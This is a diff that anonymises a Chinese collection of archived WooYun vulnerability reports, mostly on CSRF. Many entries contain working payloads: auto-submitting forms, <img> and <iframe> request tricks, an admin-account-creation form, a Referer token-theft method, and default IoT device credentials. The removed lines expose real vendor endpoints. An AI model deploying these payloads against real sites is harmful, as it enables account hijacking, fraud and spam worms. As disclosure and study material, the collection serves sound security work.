-### [wooyun-2012-08502] 新浪微博某处CSRF漏洞
-**厂商**: 新浪 | **年份**: 2012 | **类型**: CSRF
+### [wooyun-2012-08502] 某社交平台某社交平台某处CSRF漏洞
+**厂商**: 某社交平台 | **年份**: 2012 | **类型**: CSRF
 
 **元思考**: 触发信号: 功能测试
 
@@ -963,7 +963,7 @@
 
 **详情**: 在接受POST和GET的信息的时候，未对POST来路(Referer)进行验证，同时也没有在POST的信息中加token验证信息的正确性，导致漏洞产生。
 
-**POC**: 漏洞地址：http://gongyi.weibo.com/aj/mblog/addmblog<html><body><form id="imlonghao" name="imlonghao" action="http://gongyi.weibo.com/aj/mblog/addmblog" method="post"><input type="text" name="type" value="support" /><input type="text" name="gid" value="100346" /><input type="text" name="appkey" value="" /
+**POC**: 漏洞地址：https://example.com/[已脱敏] id="imlonghao" name="imlonghao" action="https://example.com/[已脱敏]" method="post"><input type="text" name="type" value="support" /><input type="text" name="gid" value="100346" /><input type="text" name="appkey" value="" /
 
 **绕过**: 直接利用
 
@@ -993,8 +993,8 @@
 ---
 
 ---
-### [wooyun-2012-013924] 新浪微博某处CSRF自动加关注漏洞
-**厂商**: 新浪微博 | **年份**: 2012 | **类型**: CSRF
+### [wooyun-2012-013924] 某社交平台某社交平台某处CSRF自动加关注漏洞
+**厂商**: 某社交平台某社交平台 | **年份**: 2012 | **类型**: CSRF
 
 **元思考**: 触发信号: 功能测试
 
@@ -1007,7 +1007,7 @@
 
 **详情**: 在网站框架内嵌入代码，当别人访问你的网站时，不需按关注按钮，即可自动关注你先前设定的账户。
 
-**POC**: <html><body><form id="imlonghao" name="imlonghao" action="http://widget.weibo.com/list/aj_attuser.php" method="post"><input type="text" name="fuid" value="1791277461" /></form><script>document.imlonghao.submit();</script></body></html>
+**POC**: <html><body><form id="imlonghao" name="imlonghao" action="https://example.com/[已脱敏]" method="post"><input type="text" name="fuid" value="1791277461" /></form><script>document.imlonghao.submit();</script></body></html>
 
 **绕过**: 直接利用
 
@@ -1015,8 +1015,8 @@
 ---
 
 ---
-### [wooyun-2011-01373] 新浪微博管理后台地址及一些信息泄漏和可能的攻击
-**厂商**: 新浪 | **年份**: 2011 | **类型**: 设计缺陷/逻辑错误
+### [wooyun-2011-01373] 某社交平台某社交平台管理后台地址及一些信息泄漏和可能的攻击
+**厂商**: 某社交平台 | **年份**: 2011 | **类型**: 设计缺陷/逻辑错误
 
 **元思考**: 触发信号: 参数注入, 后台管理
 
@@ -1027,13 +1027,13 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 新浪微博管理后台会有管理员对传播的url进行专人审核，但是由于程序对referer的控制不严格，该url就会被一些统计系统捕捉到。http://monitor.admin.t.sina.com.cn/monitor/url_list.php?confirm=0&status=0&stime=2011-02-20+23%3A10%3A00&etime=2011-02-20+23%3A19%3A59从该url我们可以了解到新浪的微博后台管理地址和审核机制，其中人工的审核机制可能导致一些被挂马和钓鱼的风险，我们这里是有浏览器和版本信息的；另外，通过分析其中的url参数，可能存在有csrf攻击，里面是没有token机制的，直接攻击后台；再另外，monitor.admin.t.sina.com.cn是一个内部地址，但是外部可以ping通，本身也泄漏了一些信息
+**详情**: 某社交平台某社交平台管理后台会有管理员对传播的url进行专人审核，但是由于程序对referer的控制不严格，该url就会被一些统计系统捕捉到。https://example.com/[已脱敏]
 
 **POC**: 在上面了
 
 **绕过**: 直接利用
 
-**修复**: 貌似不只新浪一个系统有这个问题，很多的管理后台都会有这种风险，建议在跳转外部地址时去掉里面的referer
+**修复**: 貌似不只某社交平台一个系统有这个问题，很多的管理后台都会有这种风险，建议在跳转外部地址时去掉里面的referer
 ---
 
 ---
@@ -1051,7 +1051,7 @@
 
 **详情**: 
 
-**POC**: 上次有个缺陷，很鸡肋，剑心他妹的给我不通过~http://wooyun.org/bugs/wooyun-2013-035013/trace/a2e7d15ff2d6b86ec71d6a2d7cf90b0e不然我2013-08-22日就提交了你们的，不然现在就有礼物了，可恶，其实利用起来不难，只是用火狐修改元素，点进去，我图片已经很清楚了，剑心居然看不出，好样的~- -
+**POC**: 上次有个缺陷，很鸡肋，剑心他妹的给我不通过~https://example.com/[已脱敏] -
 
 **绕过**: 直接利用
 
@@ -1071,9 +1071,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 搜狐视频的crossdomain配置为*所以，任意域的flash都可发起请求我们随便找个操作试试，比如修改昵称：请求包：http://my.tv.sohu.com/user/profile/basic_update.donickname=baobaosb123&sex=0&usermail=&year=1970&month=01&day=00&city1=0&usersign=&address=&postcode=然后我们利用flash跨域发起这个请求：当然，能做的不止如此，基本上用户能发起的请求，都可以成功！PS：本来想着用“发私信”功能尝试做一个简单的蠕虫，但是奈何它有验证码，并且本人js水平有限，所以还是搁浅了。
+**详情**: 搜狐视频的crossdomain配置为*所以，任意域的flash都可发起请求我们随便找个操作试试，比如修改昵称：请求包：https://example.com/[已脱敏]
 
-**POC**: POC：http://jeary.org/flashCSRF/ContentHijacking.html?objfile=http://jeary.org/flashCSRF/objects/ContentHijacking.swf&objtype=flash&target=http://my.tv.sohu.com/user/profile/basic_update.do&postdata=nickname=baobaosb987123x&usermail=&year=0000&month=00&day=00&city1=0&usersign=&address=&postcode=真实场景会
+**POC**: POC：https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -1093,9 +1093,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 刷粉丝漏洞！可CSRF，可首页蠕虫。仅测试！目测现在官方V3 用户3K+，若要刷粉，请看这里。站点：http://demo.thinksns.com还是个demo啊，就要好好测试。未对CSRF设防，加关注、取消关注，直接为GET方式，可导致CSRF蠕虫。看两个请求：关注某人：GET /t3/index.php?app=public&mod=Follow&act=doFollow&fid=39XX HTTP/1.1取消关注：GET /t3/index.php?app=public&mod=Follow&act=unFollow&fid=39XX HTTP/1.1当然，这个fid就是需要被照顾的对象啦！刷起来
+**详情**: 刷粉丝漏洞！可CSRF，可首页蠕虫。仅测试！目测现在官方V3 用户3K+，若要刷粉，请看这里。站点：https://example.com/[已脱敏] /t3/index.php?app=public&mod=Follow&act=doFollow&fid=39XX HTTP/1.1取消关注：GET /t3/index.php?app=public&mod=Follow&act=unFollow&fid=39XX HTTP/1.1当然，这个fid就是需要被照顾的对象啦！刷起来
 
-**POC**: 利用方式可以在ThinkSNS 站内任何地方插入此链接，当然，最直接的就是放到首页去了！任何人看到首页的这条动态信息，点击就能自动关注此fid当然，为了效果更好，你可以把内容做的更具有吸引力！当其他用户点击了此条动态效果关注成功。关注失败，因为这是我自己，自己不能关注自己。很快，就收到新粉丝通知不管你是写日志，更新状态，都可以讲此动态同步到首页，发一条微博，让大家都来关注你！仅测试，未蠕
+**POC**: 利用方式可以在ThinkSNS 站内任何地方插入此链接，当然，最直接的就是放到首页去了！任何人看到首页的这条动态信息，点击就能自动关注此fid当然，为了效果更好，你可以把内容做的更具有吸引力！当其他用户点击了此条动态效果关注成功。关注失败，因为这是我自己，自己不能关注自己。很快，就收到新粉丝通知不管你是写日志，更新状态，都可以讲此动态同步到首页，发一条某社交平台，让大家都来关注你！仅测试，未蠕
 
 **绕过**: 直接利用
 
@@ -1115,9 +1115,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://lisniuse.blog.sohu.com/a/home/entry/delete.htm
+**详情**: https://example.com/[已脱敏]
 
-**POC**: 构造以下表单<form action="http://lisniuse.blog.sohu.com/a/home/entry/delete.htm" method="post" ><input type="hidden" name="ids" value="275280127"><input type="submit" value="ok"></form>ids 为博客文章 ID ，查找方法:文章的URL直接显示利用方法：通过各种渠道（邮箱，微博，私信，消息）诱骗对方打开你的地址。
+**POC**: 构造以下表单<form action="https://example.com/[已脱敏]" method="post" ><input type="hidden" name="ids" value="275280127"><input type="submit" value="ok"></form>ids 为博客文章 ID ，查找方法:文章的URL直接显示利用方法：通过各种渠道（邮箱，某社交平台，私信，消息）诱骗对方打开你的地址。
 
 **绕过**: 直接利用
 
@@ -1125,8 +1125,8 @@
 ---
 
 ---
-### [wooyun-2012-05818] 百度wap贴吧csrf
-**厂商**: 百度 | **年份**: 2012 | **类型**: CSRF
+### [wooyun-2012-05818] 某搜索引擎wap贴吧csrf
+**厂商**: 某搜索引擎 | **年份**: 2012 | **类型**: CSRF
 
 **元思考**: 触发信号: 功能测试
 
@@ -1137,9 +1137,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 在贴吧发个图片，再把图片重定向：http://wapp.baidu.com/f/m?tn=bdFIL&z=1287559916&word=%D1%CC%BA%AE%CB%AE&day=1&ntn=banid&un=%D1%CC%BA%AE%CB%AE&fid=1882952&pn=1&expand=&pinf=1__吧主打开贴子就可以让他封人啦
+**详情**: 在贴吧发个图片，再把图片重定向：https://example.com/[已脱敏]
 
-**POC**: 去年的栗子 http://t.cn/zOKERB1
+**POC**: 去年的栗子 https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -1159,7 +1159,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 九阳豆浆机本身开放两个端口1. 80 端口开放 http 服务，需要 basic 认证；2. 8899 端口为 tcp 端口；对固件进行分析可能会更彻底些，通过如下两种途径都能够获取到固件1. 通过类似 http://api.joyoung.com:8089/ia/appfiles/2015/06/30/f66c88cd3d804f75b4ad9a191763fbe6.bin（该地址已经失效） 地址从官网获取固件；2. 拆机从 flash 中 dump 固件；通过 strings 和 ida 对固件进行分析，得到如下信息：1. 设备 WIFI 模块使用的是 Hi-Flying 的 HF-LPB100 解决方案2. HF-LPB100 提供 80 服务，默认用户名密码均为 admin，九阳修改为：Joyoung-IOT / jyyjy3. 8899 为 WIFI 模块的 tcp 调试端口，通
+**详情**: 九阳豆浆机本身开放两个端口1. 80 端口开放 http 服务，需要 basic 认证；2. 8899 端口为 tcp 端口；对固件进行分析可能会更彻底些，通过如下两种途径都能够获取到固件1. 通过类似 https://example.com/[已脱敏] 地址从官网获取固件；2. 拆机从 flash 中 dump 固件；通过 strings 和 ida 对固件进行分析，得到如下信息：1. 设备 WIFI 模块使用的是 Hi-Flying 的 HF-LPB100 解决方案2. HF-LPB100 提供 80 服务，默认用户名密码均为 admin，九阳修改为：Joyoung-IOT / jyyjy3. 8899 为 WIFI 模块的 tcp 调试端口，通
 
 **POC**: 我的设备目前已经被拆解了，之前没保留远程控制的图片，不过你们看漏洞描述应该就明白了。
 
@@ -1183,7 +1183,7 @@
 
 **详情**: 千品网修改邮箱处未验证token,可通过一个精心构造的的表单修改中招者的邮箱，达到劫持的目的。由于邮箱需要唯一性，所以可以通过一个数组来随机抽取。
 
-**POC**: POC:<html><body><form name="csrf" action="http://www.qianpin.com/user/sendUpdateEmail.do" method="POST"><input type=text name=oe value="root@wooyun.org"></input><script>var email =['root1@wooyun.org','root2@wooyun.org','root3@wooyun.org','root4@wooyun.org','root5@wooyun.org','root6@wooyun.org','root
+**POC**: POC:<html><body><form name="csrf" action="https://example.com/[已脱敏]" method="POST"><input type=text name=oe value="root@wooyun.org"></input><script>var email =['root1@wooyun.org','root2@wooyun.org','root3@wooyun.org','root4@wooyun.org','root5@wooyun.org','root6@wooyun.org','root
 
 **绕过**: 直接利用
 
@@ -1213,8 +1213,8 @@
 ---
 
 ---
-### [wooyun-2013-022062] 腾讯微博CSRF刷粉丝漏洞
-**厂商**: 腾讯 | **年份**: 2013 | **类型**: CSRF
+### [wooyun-2013-022062] 某互联网公司某社交平台CSRF刷粉丝漏洞
+**厂商**: 某互联网公司 | **年份**: 2013 | **类型**: CSRF
 
 **元思考**: 触发信号: 认证接口
 
@@ -1225,7 +1225,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 腾讯微博CSRF刷粉丝漏洞，直接的链接。。。可直接 img可 img 或 iframe ，具体利用，你懂得http://rejoice.qq.com/default/listen?nick=wooyun2于第三方网站，登陆了的访问了就能收听。<img src="http://rejoice.qq.com/default/listen?nick=wooyun2" />这里就不详细证明了。。自己玩去。。。
+**详情**: 某互联网公司某社交平台CSRF刷粉丝漏洞，直接的链接。。。可直接 img可 img 或 iframe ，具体利用，你懂得https://example.com/[已脱敏] src="https://example.com/[已脱敏]" />这里就不详细证明了。。自己玩去。。。
 
 **POC**: (见原文)
 
@@ -1291,7 +1291,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 见http://zone.wooyun.org/content/6463插入图片处插入http://zone.wooyun.org/index.php?do=edit&act=delcomment&id=【commentLi ID】&x.jpg，管理人员访问该贴时即可删除该条回复。妈妈再也不用担心我在社区跟别人吵架吵不过对方了。
+**详情**: 见https://example.com/[已脱敏] ID】&x.jpg，管理人员访问该贴时即可删除该条回复。妈妈再也不用担心我在社区跟别人吵架吵不过对方了。
 
 **POC**: 楼主回复二楼的一条回复和@xsser的一条回复已被成功删除。
 
@@ -1301,8 +1301,8 @@
 ---
 
 ---
-### [wooyun-2015-0136903] 微信公众号管理员后台点击我发的消息链接，公众号介绍等设置就会被修改（绕过csrf防护）
-**厂商**: 腾讯 | **年份**: 2015 | **类型**: CSRF
+### [wooyun-2015-0136903] 某互联网公司公众号管理员后台点击我发的消息链接，公众号介绍等设置就会被修改（绕过csrf防护）
+**厂商**: 某互联网公司 | **年份**: 2015 | **类型**: CSRF
 
 **元思考**: 触发信号: 参数注入, 后台管理
 
@@ -1313,7 +1313,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 微信公共号后台的CSRF防护是有的，token防护加referrer限制，看起来很完美但是，由于设计的一些不合理，仍然可被csrf攻击，以下是详情1、公众号后台的token的设计问题公众号后台的csrf防护的token直接在后台所有操作的url中都会出现。这样token就有可能被http包里的referer字段发往第三方而泄露。我在以前写过的文章 http://drops.wooyun.org/web/7112 里也提过这个问题的风险，当时我说削弱了防护体系。一旦其他的防护有问题的时候，这个问题就会被利用2、先偷TOKEN发送一个自己可控内容的https（公众后台是https的，只给https传递referrer）的url给微信公众账号，一旦他点击，管理后台url里的token就会发给我们。直接给公众号发送url，后台是不会识别的。需要一个小技巧来给后台发链接把链接到微信的聊天框中然后访问
+**详情**: 某互联网公司公共号后台的CSRF防护是有的，token防护加referrer限制，看起来很完美但是，由于设计的一些不合理，仍然可被csrf攻击，以下是详情1、公众号后台的token的设计问题公众号后台的csrf防护的token直接在后台所有操作的url中都会出现。这样token就有可能被http包里的referer字段发往第三方而泄露。我在以前写过的文章 https://example.com/[已脱敏] 里也提过这个问题的风险，当时我说削弱了防护体系。一旦其他的防护有问题的时候，这个问题就会被利用2、先偷TOKEN发送一个自己可控内容的https（公众后台是https的，只给https传递referrer）的url给某互联网公司公众账号，一旦他点击，管理后台url里的token就会发给我们。直接给公众号发送url，后台是不会识别的。需要一个小技巧来给后台发链接把链接到某互联网公司的聊天框中然后访问
 
 **POC**: 拿了一个朋友的公众账号做测试，她不知情给公众账号发链接她点击后介绍被我修改成"hacked by koreans"由于她被我攻击，所以她要求我补偿她给她推广公众号，她的号和照片如下加他的公众账号吧，你的人生开始不再虚度
 
@@ -1337,7 +1337,7 @@
 
 **详情**: 凤凰网修改邮箱处存在csrf，更改掉了邮箱，账号不就控制了吗？但是，邮箱这个比较特殊，需要唯一性。于是，我们可以用 js从数组中随机抽取一个。另外，凤凰网修改邮箱的请求中还需要一个"oe"的参数（old email)，我还以为用不了的，可是这一项可以随便填，于是直接无视了。
 
-**POC**: POC:<html><body><form name="csrf" action="http://my.ifeng.com/?_c=user&_a=do-edit-email" method="POST"><input type=text name=oe value="root@wooyun.org"></input><script>var email =['root1@wooyun.org','root2@wooyun.org','root3@wooyun.org','root4@wooyun.org','root5@wooyun.org','root6@wooyun.org','root7
+**POC**: POC:<html><body><form name="csrf" action="https://example.com/[已脱敏]" method="POST"><input type=text name=oe value="root@wooyun.org"></input><script>var email =['root1@wooyun.org','root2@wooyun.org','root3@wooyun.org','root4@wooyun.org','root5@wooyun.org','root6@wooyun.org','root7
 
 **绕过**: 直接利用
 
@@ -1357,7 +1357,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 全版本通杀！~不得不说dz的csrf几乎么有，这个csrf是收藏论坛板块的功能。直接get请求的csrf，下面是我本地搭建测试的。url为 http://www.xxx.com/home.php?mod=spacecp&ac=favorite&type=forum&id=2&handlekey=favoriteforum&infloat=yes&handlekey=a_favorite&inajax=1&ajaxtarget=fwin_content_a_favoriteid可控。
+**详情**: 全版本通杀！~不得不说dz的csrf几乎么有，这个csrf是收藏论坛板块的功能。直接get请求的csrf，下面是我本地搭建测试的。url为 https://example.com/[已脱敏]
 
 **POC**: 。
 
@@ -1379,7 +1379,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 测试系统信息（官网最新版）：官网：http://www.xiao5u.com/Product/Survey.html系统名称：校无忧问卷调查系统系统版本：V2.4##1 后台添加管理员帐号的请求如下。##2 经过测试发现请求没有验证referer，所以可以构造外部poc来进行CSRF攻击，POC测试代码如下。<form id="csrfdemo" action="http://127.0.0.1/asp/Survey/admin/Admin.asp" method="POST"><input type='hidden' name='Username' value='test111'><input type='hidden' name='Password1' value='123456'><input type='hidden' name='Password2' value='123456'
+**详情**: 测试系统信息（官网最新版）：官网：https://example.com/[已脱敏] 后台添加管理员帐号的请求如下。##2 经过测试发现请求没有验证referer，所以可以构造外部poc来进行CSRF攻击，POC测试代码如下。<form id="csrfdemo" action="http://[IP已脱敏] method="POST"><input type='hidden' name='Username' value='test111'><input type='hidden' name='Password1' value='123456'><input type='hidden' name='Password2' value='123456'
 
 **POC**: 看上面。
 
@@ -1411,8 +1411,8 @@
 ---
 
 ---
-### [wooyun-2013-036968] 百度贴吧某功能CSRF漏洞outoken参数问题
-**厂商**: 百度 | **年份**: 2013 | **类型**: CSRF
+### [wooyun-2013-036968] 某搜索引擎贴吧某功能CSRF漏洞outoken参数问题
+**厂商**: 某搜索引擎 | **年份**: 2013 | **类型**: CSRF
 
 **元思考**: 触发信号: 参数注入, 认证接口
 
@@ -1423,7 +1423,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 我语文表达不好...=_=,还有下面有些是猜测1.这个是新的连接：http://duokoo.baidu.com/novel/?R=517&v=2&pageid=E70dlhtt&bck=1386&jump_p_id=M5ht79md&logout=1&outoken=d1f753d5ba3d557beda7715e09f9b61e&ssid=0&from=0&bd_page_type=1&uid=4850E0C9145E3CB2EFC9AAE552E0F3F8&pu=sz%40224_220%2Cta%40middle___3_537&fr=home&netFlag=cmnet&usid=062921E7609FB5C3A8A80BEB1CDD97B1&rdtp=0&dkfrc=12.这个新的连接插入图片那会出现未知错误，但是删掉&pu=sz%40224_220%2Cta%40middl
+**详情**: 我语文表达不好...=_=,还有下面有些是猜测1.这个是新的连接：https://example.com/[已脱敏]
 
 **POC**: 1.没有获取outoken值2.发带那三个带有自定义outoken值连接的图片3.一获二掉三酱油4.获取到的outoken值5.然后就掉了.....
 
@@ -1433,8 +1433,8 @@
 ---
 
 ---
-### [wooyun-2013-026870] 新浪Referer判断不严谨可CSRF加粉
-**厂商**: 新浪微博 | **年份**: 2013 | **类型**: CSRF
+### [wooyun-2013-026870] 某社交平台Referer判断不严谨可CSRF加粉
+**厂商**: 某社交平台某社交平台 | **年份**: 2013 | **类型**: CSRF
 
 **元思考**: 触发信号: 功能测试
 
@@ -1445,9 +1445,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 和我上一个漏洞一样，新浪对某些应用带有自动授权行为。第三方应用不严谨导致漏洞存在（这个应用貌似也是新浪官方的）。主要是Referer判断不严谨。可以导致http://weiwen.weibo.com.zile.me 这种域名欺诈。
+**详情**: 和我上一个漏洞一样，某社交平台对某些应用带有自动授权行为。第三方应用不严谨导致漏洞存在（这个应用貌似也是某社交平台官方的）。主要是Referer判断不严谨。可以导致https://example.com/[已脱敏] 这种域名欺诈。
 
-**POC**: 如果微问应用没有授权，使用强制加载页面则可自动授权。如果以前用过直接构造From Post即可。虽然加了不能iframe加载，也可以绕过的。<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN""http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"><html xmlns="http://www.w3.org/1999/xhtml"><head><meta http-equiv="Content-Type" content="text/html; charset=u
+**POC**: 如果微问应用没有授权，使用强制加载页面则可自动授权。如果以前用过直接构造From Post即可。虽然加了不能iframe加载，也可以绕过的。<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN""https://example.com/[已脱敏]"><html xmlns="https://example.com/[已脱敏]"><head><meta http-equiv="Content-Type" content="text/html; charset=u
 
 **绕过**: 直接利用
 
@@ -1469,7 +1469,7 @@
 
 **详情**: 虎扑有个银行功能, 存款单位为卡路里这次试了一下抓包看到过程没有token, refer去掉后也依旧转帐成功, 证明存在CSRF可能性
 
-**POC**: 1. 利用xss.js中的代码，在服务器上建立一个html页面<html><script src="xss.js"></script><script>xss.csrf(url="http://my.hupu.com/bank_act.php", {"action": "virement", "pwuser": "admin", "to_money": "50", "content_plus": "csrf"});</script></html>2. 用户点击后就会自动给admin用户转帐50卡路里3. 利用方面主要依赖钓鱼技巧，给特定用户发链接钓其中招
+**POC**: 1. 利用xss.js中的代码，在服务器上建立一个html页面<html><script src="xss.js"></script><script>xss.csrf(url="https://example.com/[已脱敏]", {"action": "virement", "pwuser": "admin", "to_money": "50", "content_plus": "csrf"});</script></html>2. 用户点击后就会自动给admin用户转帐50卡路里3. 利用方面主要依赖钓鱼技巧，给特定用户发链接钓其中招
 
 **绕过**: 直接利用
 
@@ -1491,7 +1491,7 @@
 
 **详情**: 
 
-**POC**: http://www.xiami.com/song/showcollect/id/22324995?spm=0.0.0.0.4VFX2t
+**POC**: https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -1511,7 +1511,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 直接get啥处理都没,5875540为ID号添加关注http://service.mtime.com/Service/Twitter.msi?Ajax_CallBack=true&Ajax_CallBackType=Mtime.Service.Pages.TwitterService&Ajax_CallBackMethod=Follow&Ajax_CrossDomain=1&Ajax_RequestUrl=http%3A%2F%2Fmy.mtime.com%2Fapp%2Ft%2Fsearch%2Fuser%2F%3Fcontent%3D%25E4%25B8%258D%25E5%25BC%25BA%26searchtype%3D0%26usertype%3D0%26locationtype%3D0%26locationid%3D0%26sex%3D-1%26minage%3D0%26max
+**详情**: 直接get啥处理都没,5875540为ID号添加关注https://example.com/[已脱敏]
 
 **POC**: 粉丝不在多，在于质量可靠
 
@@ -1543,7 +1543,7 @@
 ---
 
 ---
-### [wooyun-2013-021598] 搜狐微博OAuth2.0获取Authorization Code过程隐患
+### [wooyun-2013-021598] 搜狐某社交平台OAuth2.0获取Authorization Code过程隐患
 **厂商**: 搜狐 | **年份**: 2013 | **类型**: 设计缺陷/逻辑错误
 
 **元思考**: 触发信号: 参数注入
@@ -1555,9 +1555,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: state参数可用于防止跨站请求伪造（CSRF）攻击，在搜狐的文档页面中，参数列表列出了此参数：http://open.t.sohu.com/en/%E4%BD%BF%E7%94%A8Authorization_Code%E8%8E%B7%E5%8F%96Access_Token但是在请求的时候附带上此参数，服务器302回来的时候，只有code而没有发送出去的state。危害程度不算高，详情可以参考 @HorseLuke 前辈的博客：http://blog.sina.com.cn/s/blog_56b798f801018jyb.html
+**详情**: state参数可用于防止跨站请求伪造（CSRF）攻击，在搜狐的文档页面中，参数列表列出了此参数：https://example.com/[已脱敏] @HorseLuke 前辈的博客：https://example.com/[已脱敏]
 
-**POC**: 搜狐微博获取Authorization Code请求和response看标红部分就可以了，简单明了。下图是新浪微博的正常状态，state都是乱填的，就是表达一下这个意思。
+**POC**: 搜狐某社交平台获取Authorization Code请求和response看标红部分就可以了，简单明了。下图是某社交平台某社交平台的正常状态，state都是乱填的，就是表达一下这个意思。
 
 **绕过**: 直接利用
 
@@ -1565,8 +1565,8 @@
 ---
 
 ---
-### [wooyun-2013-022628] 新浪微博CSRF（GET型）发微薄，可蠕虫
-**厂商**: 新浪 | **年份**: 2013 | **类型**: CSRF
+### [wooyun-2013-022628] 某社交平台某社交平台CSRF（GET型）发微薄，可蠕虫
+**厂商**: 某社交平台 | **年份**: 2013 | **类型**: CSRF
 
 **元思考**: 触发信号: 功能测试
 
@@ -1577,9 +1577,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 问题页面http://all.vic.sina.com.cn/newmondeo/api/poster_send.php?content=微博内容没有referer检测， 把地址用图片的形式发到新浪自带的论坛里[img]url[/img]只要别人一打开帖子就中招。也可以用邮件以嵌入图片的形式发到邮箱里，一旦发起GET访问就中招。影响范围很大！
+**详情**: 问题页面https://example.com/[已脱敏] 把地址用图片的形式发到某社交平台自带的论坛里[img]url[/img]只要别人一打开帖子就中招。也可以用邮件以嵌入图片的形式发到邮箱里，一旦发起GET访问就中招。影响范围很大！
 
-**POC**: <img src="http://all.vic.sina.com.cn/newmondeo/api/poster_send.php?content=请关注@乌云-漏洞报告平台"/>
+**POC**: <img src="https://example.com/[已脱敏]"/>
 
 **绕过**: 直接利用
 
@@ -1623,7 +1623,7 @@
 
 **详情**: 未修改之前url未验证token 只要登录的用户打开 都能修改成功修改之后
 
-**POC**: <iframe src="http://www.panda.tv/ajax_set_userinfo?avatar=http://i1.pdim.gs/av.jpg"></iframe>嵌入到一个html 到王校长 贴吧等地 发诱惑帖    把头像都改成XXOO 图片   特别是主播   这个无法想象。。。
+**POC**: <iframe src="https://example.com/[已脱敏]"></iframe>嵌入到一个html 到王校长 贴吧等地 发诱惑帖    把头像都改成XXOO 图片   特别是主播   这个无法想象。。。
 
 **绕过**: 直接利用
 
@@ -1645,7 +1645,7 @@
 
 **详情**: 第一次传这么长的图，不知道会不会不清楚
 
-**POC**: POC1（想去，执行后会在http://www.tuniu.com/person/  显示，需要等一会，多刷新几次）：<html><body><form action="http://www.tuniu.com/yii.php?r=guide/travelnotes/travelUser" method="POST"><input type="hidden" name="poiId" value="3922" /><input type="hidden" name="type" value="wantUser" /></form><script>document.forms[0].submit
+**POC**: POC1（想去，执行后会在https://example.com/[已脱敏]  显示，需要等一会，多刷新几次）：<html><body><form action="https://example.com/[已脱敏]" method="POST"><input type="hidden" name="poiId" value="3922" /><input type="hidden" name="type" value="wantUser" /></form><script>document.forms[0].submit
 
 **绕过**: 直接利用
 
@@ -1653,8 +1653,8 @@
 ---
 
 ---
-### [wooyun-2010-046] QQMail邮件泄露漏洞
-**厂商**: 腾讯 | **年份**: 2010 | **类型**: CSRF
+### [wooyun-2010-046] 某互联网公司Mail邮件泄露漏洞
+**厂商**: 某互联网公司 | **年份**: 2010 | **类型**: CSRF
 
 **元思考**: 触发信号: 功能测试
 
@@ -1665,7 +1665,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://mail.qq.com/cgi-bin/login?fun=passport&target=MLIST&t=login.js&pagesize=10&resp_charset=UTF8js-hijack可以取得返回的url，然后进一步可以获取邮件内容http://m138.mail.qq.com/cgi-bin/mail_list?flag=new&s=unread&folderid=8&folderid=1&folderid=3&folderid=user&fun=slock&sid=KCSRLFNrsbsbsbsCR9TjJR1djyz&pagesize=10&resp_charset=UTF8&t=mail_list.js同样是js-hijacking
+**详情**: https://example.com/[已脱敏]
 
 **POC**: 如上
 
@@ -1675,8 +1675,8 @@
 ---
 
 ---
-### [wooyun-2014-070403] 百度贴吧CSRF漏洞可刷会员关注
-**厂商**: 百度 | **年份**: 2014 | **类型**: CSRF
+### [wooyun-2014-070403] 某搜索引擎贴吧CSRF漏洞可刷会员关注
+**厂商**: 某搜索引擎 | **年份**: 2014 | **类型**: CSRF
 
 **元思考**: 触发信号: 参数注入
 
@@ -1687,9 +1687,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 1.去目标贴吧随便找个帖子，在帖子后面加上参数?fr_bdps_bottom_login=1&autolike=1,然后可以关注该贴吧2.http://tieba.baidu.com/p/3197673292?fr_bdps_bottom_login=1&autolike=1(访问这个帖子，就可以关注我的贴吧)3.(1).如图，未关注状态(2).访问带参数的帖子，提示，已关注，然后跳转到帖子所在的贴吧(3)
+**详情**: 1.去目标贴吧随便找个帖子，在帖子后面加上参数?fr_bdps_bottom_login=1&autolike=1,然后可以关注该贴吧2.https://example.com/[已脱敏])3.(1).如图，未关注状态(2).访问带参数的帖子，提示，已关注，然后跳转到帖子所在的贴吧(3)
 
-**POC**: 1.访问帖子：http://tieba.baidu.com/p/3197673292?fr_bdps_bottom_login=1&autolike=12. 即可关注我的贴吧(1).如图，未关注状态(2).访问带参数的帖子，提示，已关注，然后跳转到帖子所在的贴吧(3)
+**POC**: 1.访问帖子：https://example.com/[已脱敏] 即可关注我的贴吧(1).如图，未关注状态(2).访问带参数的帖子，提示，已关注，然后跳转到帖子所在的贴吧(3)
 
 **绕过**: 直接利用
 
@@ -1709,7 +1709,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
